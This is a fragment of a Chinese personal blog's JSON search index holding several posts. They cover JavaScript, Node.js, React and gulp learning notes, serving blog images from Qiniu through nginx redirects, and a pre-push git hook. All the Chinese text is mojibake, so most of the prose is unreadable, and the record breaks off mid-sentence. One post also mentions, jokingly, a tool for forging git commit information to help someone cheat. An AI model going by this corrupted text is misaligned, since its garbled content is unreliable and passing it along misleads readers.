å’Œ SublimeGitçš„ ST:å¥½å§â€¦æˆ‘æŠŠ ST é…ç½®çš„åƒ Atom äº†ï¼ˆæ‘Šæ‰‹å®Œã€‚","categories":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://blog.stdioa.com/categories/éšç¬”/"}],"tags":[{"name":"Atom","slug":"Atom","permalink":"https://blog.stdioa.com/tags/Atom/"},{"name":"Sublime Text","slug":"Sublime-Text","permalink":"https://blog.stdioa.com/tags/Sublime-Text/"},{"name":"æ–‡æœ¬ç¼–è¾‘å™¨","slug":"æ–‡æœ¬ç¼–è¾‘å™¨","permalink":"https://blog.stdioa.com/tags/æ–‡æœ¬ç¼–è¾‘å™¨/"},{"name":"Git","slug":"Git","permalink":"https://blog.stdioa.com/tags/Git/"}]},{"title":"Javascriptå­¦ä¹ æ€»ç»“","slug":"learning-javascript","date":"2016-02-24T11:31:42.000Z","updated":"2017-06-29T04:38:40.299Z","comments":true,"path":"2016/02/learning-javascript/","link":"","permalink":"https://blog.stdioa.com/2016/02/learning-javascript/","excerpt":"ä»å¼€å§‹å†™Javascriptåˆ°ç°åœ¨ï¼Œå·²ç»æœ‰ä¸€ä¸ªæœˆäº†ï¼Œè¿™ä¸€ä¸ªæœˆå­¦äº†ä¸å°‘æ–°å§¿åŠ¿ï¼Œéšä¾¿å†™å†™ï¼Œç®€å•æ•´ç†ä¸€ä¸‹ã€‚","text":"ä»å¼€å§‹å†™Javascriptåˆ°ç°åœ¨ï¼Œå·²ç»æœ‰ä¸€ä¸ªæœˆäº†ï¼Œè¿™ä¸€ä¸ªæœˆå­¦äº†ä¸å°‘æ–°å§¿åŠ¿ï¼Œéšä¾¿å†™å†™ï¼Œç®€å•æ•´ç†ä¸€ä¸‹ã€‚ 1. Javascriptè¿™ä¸ªæ²¡ä»€ä¹ˆå¥½æ•´ç†çš„â€¦éšä¾¿å†™å‡ æ¡ã€‚1234567891011(function () &#123; var a; // é˜²æ­¢å˜é‡ä½œç”¨åŸŸæå‡ do_something();&#125;()); some_list.map(function (obj) &#123; this.do_something(obj); &#125;, this); // æŠŠthisä¼ åˆ°mapé‡Œé¢çš„åŒ¿åå‡½æ•°ä¸­ï¼Œå¦åˆ™é‡Œé¢çš„thisä¸ºundefined setInterval(function () &#123;&#125;, 1000);setTimeout(function () &#123;&#125;, 1000); 2. jQuery 2.1 é€‰æ‹©å™¨1234$(\"input[type=text]\") // é€‰æ‹©å±æ€§$(\"ul&gt;li:eq(3)\") // é€‰æ‹©ç¬¬4ä¸ªliå…ƒç´ $(\"ul&gt;li\").eq(3) // é€‰æ‹©æ‰€æœ‰\"ul&gt;li\"ä¸­çš„ç¬¬4ä¸ªå…ƒç´ ï¼ˆæ³¨æ„ä¸ä¸Šé¢é‚£ä¸ªé€‰æ‹©å™¨çš„ä¸åŒï¼‰$(\"ul&gt;li:even\") // é€‰æ‹©æ‰€æœ‰å¥‡æ•°liå…ƒç´ ï¼ˆoddåŒç†ï¼‰ 2.2 æ‚é¡¹è·å–è¡¨å•å†…å®¹æ—¶ï¼Œè¦ç”¨$(&quot;...&quot;).val()è€Œä¸æ˜¯$(&quot;...&quot;).text(). 3. Node.jsä¸çŸ¥é“å†™ä»€ä¹ˆï¼Œéšä¾¿å†™å‡ ä¸ªå¥½ç©çš„åº“ï¼šcheerio, åœ¨æœåŠ¡å™¨ç«¯è§£æhtmlï¼Œè·ŸjQueryç”¨æ³•å·®ä¸å¤šchalk, è¾“å‡ºå½©è‰²æ–‡å­—gulp, æµå¼è‡ªåŠ¨åŒ–æ„å»ºå·¥å…·ï¼Œåé¢ç»†å†™May.2 2017 æ›´æ–° 3.1 Node.js æ–‡æ¡£é˜…è¯»ç¬”è®° 3.1.1 console.timerè®¡æ—¶å·¥å…·ã€‚1234console.time('100-elements');for (let i = 0; i &lt; 100; i++);console.timeEnd('100-elements');// 100-elements: 0.238ms 3.1.2 BufferBuffer åœ¨å¤„ç†æ–‡ä»¶æˆ–æµæ—¶å¯èƒ½ä¼šç”¨åˆ°ï¼Œåœ¨å¤„ç†æ–‡ä»¶æ—¶ï¼Œè·Ÿ Python çš„ bytes æœ‰äº›ç›¸ä¼¼ã€‚åˆ›å»º Buffer: Buffer.alloc(10) æˆ– Buffer.from([1, 2, 3])ï¼›é•¿åº¦ï¼š buf.lengthï¼›åˆ‡åˆ†ï¼š buf.slice([start, [end]])ï¼›å­—ç¬¦ä¸²ä¸ Buffer è½¬æ¢ï¼š12345678&gt; b = Buffer.from(\"å“¦\")&lt;Buffer e5 93 a6&gt;&gt; b[0]229&gt; b.toString('utf-8')'å“¦'&gt; b.toString('base64')'5ZOm' 3.1.3 child_processç”Ÿæˆå­è¿›ç¨‹ï¼Œæ‰§è¡Œæ–‡ä»¶ï¼š1234567891011121314const spawn = require('child_process').spawn;const ls = spawn('ls', ['-lh', '/usr']); ls.stdout.on('data', (data) =&gt; &#123; console.log(`stdout: $&#123;data&#125;`);&#125;); ls.stderr.on('data', (data) =&gt; &#123; console.log(`stderr: $&#123;data&#125;`);&#125;); ls.on('close', (code) =&gt; &#123; console.log(`child process exited with code $&#123;code&#125;`);&#125;);å¦‚æœè¿›ç¨‹å¯ä»¥ç«‹å³ç»“æŸï¼ˆæ¯”å¦‚ lsï¼‰ï¼Œæˆ–è€…ä¸éœ€è¦å®æ—¶æŸ¥çœ‹ stdout çš„è¾“å‡ºï¼Œå¯ä»¥ä½¿ç”¨ child_process.exec:123456789const exec = require('child_process').exec;exec('cat *.js bad_file | wc -l', (error, stdout, stderr) =&gt; &#123; if (error) &#123; console.error(`exec error: $&#123;error&#125;`); return; &#125; console.log(`stdout: $&#123;stdout&#125;`); console.log(`stderr: $&#123;stderr&#125;`);&#125;); 3.1.4 Pathç”¨äºå¤„ç†æ–‡ä»¶è·¯å¾„ï¼Œè·Ÿ os.path ç±»ä¼¼ã€‚12345678path.join('/foo', 'bar', 'baz/asdf', 'quux', '..')// Returns: '/foo/bar/baz/asdf' path.normalize('/a/b//../c/./d/')'/a/c/d/' path.relative('/data/orandea/test/aaa', '/data/orandea/impl/bbb')// Returns: '../../impl/bbb' 4. React.js 4.1 JSXä¸BabelJSXæ˜¯ä¸€ç§è¯­è¨€ï¼Œbabelæ˜¯ä¸€ç§é¢„å¤„ç†å·¥å…·ã€‚JSXå¯ä»¥åœ¨æµè§ˆå™¨ä¸­è½¬æ¢ä¸ºjavascriptå¹¶æ‰§è¡Œï¼Œæœ‰ä¸¤ä¸ªå‰æï¼šåŒ…å«äº†browser.jsscriptæ ‡ç­¾çš„ç±»å‹ä¸ºtext/babelçœ‹è¿™é‡Œã€‚åœ¨å¾ˆä¹…ä»¥å‰ï¼ŒJSXä»£ç è½¬æ¢åº“åŒ…å«åœ¨Reactåº“é‡Œï¼Œåå«JSXTransformer.js, é‚£æ—¶scriptæ ‡ç­¾çš„ç±»å‹ä¸ºtext/jsx, ä½†æ˜¯åæ¥JSXä»£ç æ”¹ç”¨babelæ¥è½¬æ¢äº†ï¼Œæ‰€ä»¥scriptæ ‡ç­¾çš„ç±»å‹ä¹Ÿå°±å˜ä¸ºäº†text/babel, ä»£ç è½¬æ¢åº“ä¹Ÿä¸å†ç”±Reactæä¾›ã€‚åæ§½ï¼šæœ€åˆçœ‹tutorialçš„æ—¶å€™çœ‹çš„ä¸­æ–‡é¡µé¢ï¼Œè¿™ä¸ªé¡µé¢å¾ˆä¹…å¾ˆä¹…æ²¡æœ‰æ›´æ–°è¿‡äº†ï¼Œå¾ˆå¤šå†…å®¹éƒ½è¿‡æ—¶äº†ï¼Œåœ¨ç¦»çº¿è½¬æ¢çš„æ—¶å€™éœ€è¦å®‰è£…åŒ…ï¼ŒnpmæŠ¥å‡ºä¸€å †package deprecatedçš„ä¿¡æ¯ï¼Œæ•´ä¸ªäººä¸€ä¸ªå¤§å†™çš„å§æ§½ã€‚åæ¥çœ‹äº†ä¸Šé¢çš„è‹±æ–‡é¡µé¢æ‰çŸ¥é“JSXTransformerå·²ç»ä¸å†ä½¿ç”¨äº†ï¼Œç°åœ¨å¤§å®¶éƒ½ç”¨Babel. 4.2 Reacté˜®ä¸€å³°å¤§å¤§å†™çš„Reactå…¥é—¨æ•™ç¨‹å¾ˆä¸é”™ï¼Œæˆ‘åŸºæœ¬ä¸Šæ˜¯çœ‹è¿™ä¸ªå…¥é—¨çš„ã€‚å†™JSXæ—¶ï¼Œè¦æ³¨æ„DOMèŠ‚ç‚¹çš„classå’Œforå±æ€§è¦å†™ä¸ºclassNameå’ŒhtmlForï¼Œå› ä¸ºclasså’Œforæ˜¯javascriptçš„å…³é”®å­—ã€‚ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸï¼šçœ‹å®˜æ–¹æ–‡æ¡£ï¼Œrenderå‡½æ•°ä¸­ä¸è¦æ”¹å˜ç»„ä»¶çš„stateï¼Œè‹¥ç»„ä»¶çš„propsæ”¹å˜è€Œéœ€è¦ç›¸åº”æ›´æ”¹state, åˆ™è¦åœ¨componentWillReceivePropså‡½æ•°ä¸­å®Œæˆstateæ›´æ”¹ã€‚å‡½æ•°æ‰§è¡Œå®Œåï¼Œrenderå‡½æ•°ä¼šè¢«æ‰§è¡Œï¼Œç»„ä»¶é‡æ–°æ¸²æŸ“ã€‚ 5. gulp 5.1 ç®€ä»‹æµå¼è‡ªåŠ¨åŒ–æ„å»ºå·¥å…·ï¼Œç”¨äºå„ç±»æ–‡ä»¶çš„è½¬æ¢ï¼ˆå¦‚jsxâ†’jsâ†’min.jsï¼‰ï¼Œç›‘æ§æ–‡ä»¶å˜åŒ–ï¼Œæ­å»ºé™æ€æ–‡ä»¶æœåŠ¡å™¨ç­‰ï¼Œå¯ä»¥ç±»æ¯”ä¸ºmakefile, æ‹¥æœ‰ç§ç±»ç¹å¤šçš„æ’ä»¶ã€‚gulpå®˜ç½‘ï¼Œä¸­æ–‡ç½‘ï¼ŒåŒ…å«ä¸­æ–‡æ–‡æ¡£ã€‚ 5.2 æ“ä½œgulp.task(name[, deps], fn), æ³¨å†Œä¸€ä¸ªä»»åŠ¡name: ä»»åŠ¡åç§°deps: ä¾èµ–çš„å‰ç½®ä»»åŠ¡ï¼Œstring[]fn: ä»»åŠ¡å‡½æ•°ï¼Œåœ¨é‡Œé¢å†™è¯¥ä»»åŠ¡éœ€è¦å®Œæˆçš„å…·ä½“äº‹é¡¹gulp.src(globs[, options]), è¾“å‡ºä¸€ä¸ªæ»¡è¶³åŒ¹é…æ¨¡å¼çš„stream, streamå¯ä»¥ç”¨pipeè¿æ¥èµ·æ¥ï¼Œç±»æ¯”shellçš„ç®¡é“|.gulp.dest(path[, options]), å°†streamå†™åˆ°æŸä¸ªpathå½“ä¸­ã€‚gulp.watch(glob [, opts], tasks) æˆ– gulp.watch(glob [, opts, cb]), ç›‘æ§æ»¡è¶³åŒ¹é…æ¨¡å¼çš„æ–‡ä»¶ï¼Œè‹¥æ–‡ä»¶å˜åŒ–ï¼Œåˆ™æ‰§è¡ŒæŸäº›ä»»åŠ¡ã€‚ç›´æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š1234567891011121314gulp.task('render', ['array', 'of', 'task', 'names'], function () &#123; gulp.src('./client/templates/*.jade') // æ‰¾åˆ°åŸè·¯å¾„æ‰€æœ‰çš„jadeæ–‡ä»¶ .pipe(jade()) // æ¸²æŸ“æ¨¡æ¿ .pipe(gulp.dest('./build/templates')) // è¾“å‡ºåˆ°æŸç›®å½• .pipe(minify()) // minify .pipe(gulp.dest('./build/minified_templates')); // è¾“å‡ºåˆ°å¦ä¸€ç›®å½•&#125;); gulp.task('watch', [\"compress\"], function () &#123; var watcher = gulp.watch('./public/src/*.jsx', ['compress']); // ç›‘æ§æ–‡ä»¶ï¼Œè‹¥æ–‡ä»¶å˜åŒ–åˆ™æ‰§è¡Œcompressä»»åŠ¡ watcher.on('change', function (event) &#123; // ç›‘å¬changeäº‹ä»¶ console.log('File ' + event.path + ' was ' + event.type + ', running tasks...'); &#125;);&#125;); 6. Reactå·¥å…·é›†æˆ: React+Babel+gulpç”¨gulpæ‰§è¡Œä»»åŠ¡ï¼Œç”¨babelè½¬æ¢JSX. 6.1 gulpæ‰€éœ€æ’ä»¶:gulpgulp-babelgulp-uglify (å‹ç¼©jsæ–‡ä»¶ç”¨ï¼Œå¯é€‰)gulpfile:12345678910111213141516var gulp = require('gulp');var babel = require('gulp-babel');var uglify = require('gulp-uglify');gulp.task('transform', function () &#123; return gulp.src('./public/src/*.jsx') .pipe(babel()) .pipe(gulp.dest('./public/build'));&#125;);gulp.task(\"compress\", [\"transform\"], function () &#123; return gulp.src('./public/build/!(*.min).js') .pipe(uglify()) .pipe(rename(&#123; suffix: \".min\" &#125;)) .pipe(gulp.dest('./public/build'))&#125;); 6.2 Babelæ‰€éœ€æ’ä»¶ï¼šbabel-preset-es2015babel-preset-react.babelrcæ–‡ä»¶ï¼š1234567&#123; \"presets\": [ \"es2015\", \"react\" ], \"plugins\": []&#125;è‹¥åœ¨å…¨å±€å®‰è£…äº†babel-cliï¼Œåˆ™å¯ä»¥ç”¨babelå‘½ä»¤è½¬æ¢æ–‡ä»¶ï¼šè‹¥å½“å‰ç›®å½•å­˜åœ¨ä¸Šè¿°babelrcæ–‡ä»¶ï¼šæ‰§è¡Œbabel public\\src --out-dir public\\buildè‹¥å½“å‰ç›®å½•ä¸å­˜åœ¨bebelrcæ–‡ä»¶ï¼šæ‰§è¡Œbabel --presets react public\\src --out-dir public\\build 7. Semantic UIè¶…çº§æ£’çš„ä¸€ä¸ªå‰ç«¯ç»„ä»¶åº“ï¼Œå»çœ‹æ–‡æ¡£å§ã€‚ 8. åè®°ç»ˆäºå†™å®Œäº†ã€‚åˆä¸€ä¸ªæœˆæ²¡æœ‰å†™ä¸œè¥¿äº†ï¼Œä»£ç å†™äº†ä¸å°‘ï¼Œæ‰€å­¦åˆ°çš„çŸ¥è¯†å´æ²¡æœ‰åŠæ—¶æ•´ç†ä¸‹æ¥ã€‚çœŸæ˜¯å¤ªæ‡’ï¼Œæ‡’å¾—æ•´ç†çŸ¥è¯†ã€‚åˆ°ç°åœ¨è¿˜æ¬ ç€ä¸€ç¯‡Djangoçš„ç”Ÿäº§ç¯å¢ƒé…ç½®çš„æ–‡ç« æ²¡å†™ï¼ˆå…¶å®å°±æ˜¯ä¸€æ¡å‘½ä»¤+nginxé…ç½®è€Œå·²ï¼‰ï¼Œæ”¹å¤©è¡¥ä¸Šã€‚å¯’å‡ç®—æ˜¯è’åºŸè¿‡å»äº†ï¼Œæœ¬æ¥èƒ½å¤Ÿå†™æ›´å¤šä¸œè¥¿çš„ï¼Œå´è¢«ä¸€äº›äº‹æƒ…æ‰“ä¹±äº†è®¡åˆ’ã€‚ä»¥å‰è§‰å¾—javascriptæ˜¯ä¸€é—¨å¾ˆç³Ÿç³•çš„è¯­è¨€ï¼Œä»£ç å†™èµ·æ¥å¾ˆä¹±ï¼Œå››äº”å±‚å›è°ƒçœ‹èµ·æ¥å¤´éƒ½å¤§äº†ï¼Œä½†çœŸæ­£å†™äº†ä¸€ä¸ªæœˆä»¥åæ„Ÿè§‰èˆ’æœäº†å¾ˆå¤šï¼Œå¾ˆå¤šä»£ç å†™èµ·æ¥å¾—å¿ƒåº”æ‰‹ã€‚JSçš„ç”Ÿæ€ä¹Ÿè®©æˆ‘å¾ˆå–œæ¬¢ï¼Œå„ç§å·¥å…·ç»„ä»¶å±‚å‡ºä¸ç©·ï¼Œä½¿ç”¨èµ·æ¥ä¹ŸåŠå…¶æ–¹ä¾¿ã€‚è¿™ä¸€ä¸ªæœˆæ‰€å†™çš„jsé¡¹ç›®ï¼šcarrezå‰åç«¯éƒ½æœ‰ï¼Œåç«¯Express, è§£æhtml, å‰ç«¯ä½¿ç”¨ajaxå’Œåç«¯è¿›è¡Œä¿¡æ¯äº¤äº’starwarsçº¯å‰ç«¯é¡¹ç›®ï¼Œä½¿ç”¨React, ç”¨äº†å¾ˆä¹…çš„browser.js, æœ¬åœ°å·¥å…·é›†æˆé¼“æ£äº†å¾ˆä¹…æ‰é¼“æ£æ˜ç™½git_modifierç®—æ˜¯åŠä¸ªJSé¡¹ç›®ï¼ˆGithubå‘Šè¯‰æˆ‘æˆ‘è¿™æ˜¯ä¸ªJSé¡¹ç›®ï¼Œå› ä¸ºJSä»£ç å æ¯”æœ€å¤§ï¼‰ï¼Œåç«¯Flask, å‰ç«¯React, è¯´æ˜¯Web Appå…¶å®æ˜¯ä¸ªæœ¬åœ°é¡¹ç›®ï¼Œç”¨æ¥è¯»å–åŠä¿®æ”¹æœ¬åœ°git repoçš„commitä¿¡æ¯ç”¨çš„ï¼Œå¥‡æ€ªçš„éœ€æ±‚ï¼Œå†™æ¥è‡ªå·±ç”¨ï¼Œæ–¹ä¾¿ä¼ªé€ commitä¿¡æ¯ï¼Œå¸®æŸäººä½œå¼ŠğŸ˜‚ğŸ˜‚ğŸ˜‚ã€‚åé¢çœ‹çœ‹è¦ä¸è¦å†™Mochaå§ã€‚æœ€åï¼Œéƒ‘é‡æ„Ÿè°¢phoenixeåŒå­¦ç»™äº†æˆ‘ä¸€ä¸ªæ¯”è¾ƒç³»ç»Ÿåœ°å­¦ä¹ å’Œä½¿ç”¨javascriptçš„æœºä¼šã€‚è°¢è°¢ä½ ã€‚ä»¥ä¸Šã€‚","categories":[{"name":"Javascript","slug":"Javascript","permalink":"https://blog.stdioa.com/categories/Javascript/"}],"tags":[{"name":"å‰ç«¯å¼€å‘","slug":"å‰ç«¯å¼€å‘","permalink":"https://blog.stdioa.com/tags/å‰ç«¯å¼€å‘/"},{"name":"Javascript","slug":"Javascript","permalink":"https://blog.stdioa.com/tags/Javascript/"},{"name":"node.js","slug":"node-js","permalink":"https://blog.stdioa.com/tags/node-js/"}]},{"title":"åšå®¢è¿ç§»è®°ï¼ˆä¸‰ï¼‰","slug":"blog-migration-iii","date":"2016-01-20T03:40:00.000Z","updated":"2017-06-29T04:38:40.515Z","comments":true,"path":"2016/01/blog-migration-iii/","link":"","permalink":"https://blog.stdioa.com/2016/01/blog-migration-iii/","excerpt":"ä¸€ä¸ªæœˆæ²¡æ›´æ–°ï¼ŒæœŸæœ«å¤ä¹ çš„æ—¶å€™å…‰é¼“æ£ç½‘ç«™å´æ‡’å¾—å†™ä¸œè¥¿ï¼ŒæœŸæœ«è€ƒå®Œäº†ï¼ŒæŠŠè¿™ä¸€ä¸ªæœˆé¼“æ£çš„ä¸œè¥¿è®°å½•ä¸€ä¸‹ï¼Œæ¯”å¦‚åˆ©ç”¨ä¸ƒç‰›è¿›è¡Œé™æ€æ–‡ä»¶æ‰˜ç®¡ã€‚","text":"ä¸€ä¸ªæœˆæ²¡æ›´æ–°ï¼ŒæœŸæœ«å¤ä¹ çš„æ—¶å€™å…‰é¼“æ£ç½‘ç«™å´æ‡’å¾—å†™ä¸œè¥¿ï¼ŒæœŸæœ«è€ƒå®Œäº†ï¼ŒæŠŠè¿™ä¸€ä¸ªæœˆé¼“æ£çš„ä¸œè¥¿è®°å½•ä¸€ä¸‹ï¼Œæ¯”å¦‚åˆ©ç”¨ä¸ƒç‰›è¿›è¡Œé™æ€æ–‡ä»¶æ‰˜ç®¡ã€‚ 1. ä½¿ç”¨ä¸ƒç‰›æ‰˜ç®¡é™æ€æ–‡ä»¶ 1.1 èƒŒæ™¯åšå®¢çš„äº‹æƒ…å¤„ç†å®Œæˆåï¼Œæˆ‘åˆåšäº†ä¸€ä¸ªç½‘ç«™ä¸»é¡µï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€ä¸ª100KB+çš„èƒŒæ™¯å›¾ç‰‡ã€‚ä¸è¿‡å› ä¸ºæˆ‘çš„VPSå‡ºç«™å¸¦å®½åªæœ‰1Mb/s, æ‰€ä»¥èƒŒæ™¯å›¾ç‰‡åŠ è½½æ—¶é—´è¿‡é•¿ï¼Œå¯¼è‡´ç½‘ç«™è®¿é—®é€Ÿåº¦è¾ƒæ…¢ã€‚æ‰€ä»¥æˆ‘å°†ç»å¤§éƒ¨åˆ†çš„èµ„æºå…¨éƒ¨æŒ‚åˆ°äº†ä¸ƒç‰›ä¸Šï¼Œåœ¨æœåŠ¡å™¨ç«¯å¯¹é™æ€èµ„æºè¯·æ±‚è¿›è¡Œ302è·³è½¬ï¼Œå°†æµé‡è½¬ç§»åˆ°ä¸ƒç‰›çš„èŠ‚ç‚¹ï¼Œæé«˜è®¿é—®é€Ÿåº¦ã€‚ 1.2 æ“ä½œ 1.2.1 åŒæ­¥æ–‡ä»¶æˆ‘éœ€è¦æ‰˜ç®¡çš„æ–‡ä»¶åŒ…æ‹¬åšå®¢å’Œä¸ªäººä¸»é¡µçš„æ‰€æœ‰å›¾ç‰‡æ–‡ä»¶ã€‚é¦–å…ˆï¼Œæˆ‘åœ¨ä¸ƒç‰›ä¸Šå»ºç«‹äº†ç©ºé—´cdn-stdioaå¹¶ç»‘å®šäº†ä¸ªäººåŸŸåã€ç”³è¯·äº†HTTPSåŸŸåã€‚ä¸ºæ–¹ä¾¿å°†æœ¬åœ°æ–‡ä»¶ä¸ä¸ƒç‰›ç©ºé—´åŒæ­¥ï¼Œä¸ƒç‰›æä¾›äº†å‘½ä»¤è¡ŒåŒæ­¥å·¥å…·qrsync. æŸ¥çœ‹æ–‡æ¡£åï¼Œæˆ‘æ–°å»ºå¹¶ä¿®æ”¹äº†é…ç½®æ–‡ä»¶sync_conf.jsonï¼Œå†…å®¹å¦‚ä¸‹ï¼š12345&#123; \"src\": \"blog/source/pics\", \"dest\": \"qiniu:access_key=&lt;your_access_key&gt;&amp;secret_key=&lt;your_secret&gt;key&gt;&amp;bucket=cdn-stdioa&amp;key_prefix=blog/pics/\", \"debug_level\": 1&#125;è‹¥æ·»åŠ èµ„æºï¼Œåˆ™æ‰§è¡Œqrsync sync_conf.json, å³å¯å®Œæˆé™æ€èµ„æºä¸ä¸ƒç‰›ç©ºé—´çš„è‡ªåŠ¨åŒæ­¥ã€‚ 1.2.2 åœ¨æœåŠ¡å™¨ç«¯è®¾ç½®è·³è½¬ä¸ºäº†æé«˜è®¿é—®é€Ÿåº¦ï¼Œéœ€è¦åœ¨nginxç«¯å°†æ‰€æœ‰æŒ‡å‘å›¾ç‰‡çš„è¯·æ±‚å…¨éƒ¨è·³è½¬åˆ°ä¸ƒç‰›çš„é“¾æ¥ä¸Šã€‚å­¦ä¹ äº†ä¸€ä¸‹locationé‡å®šå‘è§„åˆ™ï¼Œç›´æ¥ä¸Šé…ç½®æ–‡ä»¶å§ã€‚123location ^~ /pics &#123; return https://xxx.qnssl.com/blog$request_uri;&#125;è¿™æ ·ï¼Œå°±å¯ä»¥å°†æ‰€æœ‰æŒ‡å‘/picsçš„è¯·æ±‚å…¨éƒ¨é‡å®šå‘åˆ°ä¸ƒç‰›çš„é“¾æ¥ã€‚é¡ºä¾¿ï¼Œåœ¨ä¸ƒç‰›è®¾ç½®äº†ä¸€ä¸‹é˜²ç›—é“¾ã€‚ 1.3 æ•ˆç‡æå‡â€”â€”Git hookå› ä¸ºæˆ‘çš„åšå®¢å’Œä¸ªäººä¸»é¡µéƒ½æ˜¯ä½¿ç”¨Coding+webhookéƒ¨ç½²çš„ï¼Œæ‰€ä»¥æ¯æ¬¡æ›´æ”¹é¡µé¢åè¦æ¨ä»£ç ï¼Œè¿˜è¦åŒæ­¥é™æ€èµ„æºã€‚æœ‰æ²¡æœ‰æ–¹æ³•å¯ä»¥æŠŠè¿™ä¸¤æ¡æ“ä½œç®€åŒ–ä¸€ä¸‹å‘¢ï¼Ÿä¸€å¼€å§‹å†™äº†ä¸ªæ‰¹å¤„ç†è„šæœ¬ï¼Œåæ¥è§‰å¾—ä¸€å®šæœ‰æ›´å¥½çš„åŠæ³•ï¼Œäºæ˜¯ç¿»äº†ç¿»ï¼Œé‡åˆ°äº†Git hookè¿™ç§ç¥å™¨ã€‚Git hookè·Ÿwebhookç±»ä¼¼ï¼Œéƒ½æ˜¯åœ¨æŸä¸ªæ“ä½œä¸ŠæŒ‚ä¸€ä¸ªâ€œé’©å­â€ï¼Œä½¿å¾—åœ¨è¿›è¡ŒæŸæ“ä½œå‘ç”Ÿæ—¶è‡ªåŠ¨è§¦å‘è‡ªå®šä¹‰è„šæœ¬æ¥è¾¾åˆ°æŸäº›ç›®çš„ï¼Œå®ç°å¿«æ·æ“ä½œã€‚æ‰€æœ‰çš„é’©å­å‡åœ¨.git/hooksç›®å½•ä¸‹ï¼Œåœ¨è¯¥ç›®å½•ä¸‹è®¾ç½®ç‰¹æ®Šæ–‡ä»¶åçš„è„šæœ¬æ–‡ä»¶æ¥è®¾ç½®é’©å­ã€‚å› ä¸ºæˆ‘éœ€è¦åœ¨æ¨é€ä»£ç ä¹‹å‰è¿›è¡Œèµ„æºåŒæ­¥ï¼Œæ‰€ä»¥æˆ‘éœ€è¦è®¾ç½®pre-pushè„šæœ¬ã€‚è„šæœ¬å†…å®¹å¦‚ä¸‹ï¼š123456#!/bin/shecho -e \"Sync up the static resources with Qiniu...\"cd /f/websites/blog/qrsync sync_conf.json 2&gt;&gt;sync.logecho -e \"Done!\"è¿™æ ·ï¼Œæˆ‘å°±å¯ä»¥åœ¨æ¯æ¬¡æ‰§è¡Œgit pushä¹‹å‰è‡ªåŠ¨åŒæ­¥é™æ€èµ„æºï¼Œå°‘æ•²ä¸€æ¡å‘½ä»¤ï¼Œæå‡å·¥ä½œæ•ˆç‡â†’_â†’ 2. è°±ç«™æ­å»ºå†…å®¹ä¸æ˜¯å¤ªå¤šï¼Œå°±å†™åœ¨è¿™é‡Œå•¦ã€‚æˆ‘æœ‰ä¸€ä¸ªä¹è°±åˆ†äº«ç«™ï¼Œé‡Œé¢å­˜æ”¾ä¸€äº›è‡ªå·±æ”¶é›†çš„é’¢ç´è°±ã€‚ä¸€å¹´ä»¥å‰å†™äº†ä¸€ä¸ªç¨‹åºï¼Œç”¨æ¥ä¸ºæ¯ä¸ªæ–‡ä»¶å¤¹ç”Ÿæˆindexé¡µé¢ã€‚å‰å‡ å¤©ç¿»å¼€é‚£ä¸ªç¨‹åºï¼Œä¸€ä¸‹å­è¢«è‡ªå·±å†™çš„è¿ç¯replaceå“åˆ°äº†ï¼ˆé‚£ä¸ªæ—¶å€™è¿æ­£åˆ™è¿˜éƒ½ä¸ä¼šï¼Œä¸è¿‡è½¬å¿µä¸€æƒ³è¦æ˜¯ä¼šäº†æ­£åˆ™ï¼Œå†™å‡ºæ¥çš„ä¸œè¥¿ä¼šå¤šå¯æ€•ğŸ˜‚ï¼‰ï¼Œäºæ˜¯æ€’ç”¨Jinjaæ¨¡æ¿æ¸²æŸ“å¼•æ“é‡å†™äº†ä¸€ä¸ªï¼ŒæŠŠåŸæ¥æœ€æ ¸å¿ƒéƒ¨åˆ†çš„åå‡ è¡Œä»£ç å˜ä¸ºäº†ä¸€è¡Œæ¸²æŸ“è¯­å¥ï¼Œä»£ç çœ‹èµ·æ¥æ¸…çˆ½å¤šäº†ã€‚å—¯ï¼Œå…·ä½“é“¾æ¥å¯ä»¥åœ¨å·¦ä¾§æˆ–é¡¶æ çš„â€œå‹æƒ…é“¾æ¥â€ä¸­æ‰¾ã€‚ 3. åè®°å†ç»ä¸€ä¸ªæœˆï¼Œåšå®¢çš„è¿ç§»å·¥ä½œåŸºæœ¬å®Œæˆï¼ˆåˆšåˆšå†™åšå®¢çš„å·¥å¤«è¿˜ç»™å®ƒæ·»åŠ äº†twemojiæ”¯æŒğŸ˜¶ï¼‰ï¼Œä»¥åè¿˜è¦åšä¸ªäººé¡µé¢ï¼Œä¸è¿‡å¯èƒ½ä¸ä¼šæœ‰å¤ªå¤šå¯å†™çš„åœ°æ–¹äº†ã€‚å°±é…±ï¼Œåé¢çœ‹ä¸€é˜µå­goä»¥åå¯ä»¥æ¥å†™å†™golangçš„ä¸œè¥¿ã€‚ 4. å‚è€ƒèµ„æ–™Nginxé‡å®šå‘è§„åˆ™è¯¦ç»†ä»‹ç»è‡ªå®šä¹‰ Git - Git é’©å­","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://blog.stdioa.com/tags/nginx/"},{"name":"ä¸ƒç‰›","slug":"ä¸ƒç‰›","permalink":"https://blog.stdioa.com/tags/ä¸ƒç‰›/"},{"name":"git","slug":"git","permalink":"https://blog.stdioa.com/tags/git/"}]},{"title":"åšå®¢è¿ç§»è®°ï¼ˆäºŒï¼‰","slug":"blog-migration-ii","date":"2015-12-18T07:55:37.000Z","updated":"2017-06-29T04:38:39.867Z","comments":true,"path":"2015/12/blog-migration-ii/","link":"","permalink":"https://blog.stdioa.com/2015/12/blog-migration-ii/","excerpt":"åŸŸåä¾ç„¶åœ¨å¤‡æ¡ˆä¸­ï¼Œä¾ç„¶æƒ³å°†åšå®¢éƒ¨ç½²åˆ°æ–°ä¹°çš„VPSçš„æˆ‘å’Œè…¾è®¯æ–—æ™ºæ–—å‹‡ï¼ˆé›¾ï¼‰ï¼Œä¸ºåšå®¢æ·»åŠ äº†HTTPS&gt;_&lt;åŒæ—¶ï¼ŒæŠŠè‡ªå·±çš„å¯†ç 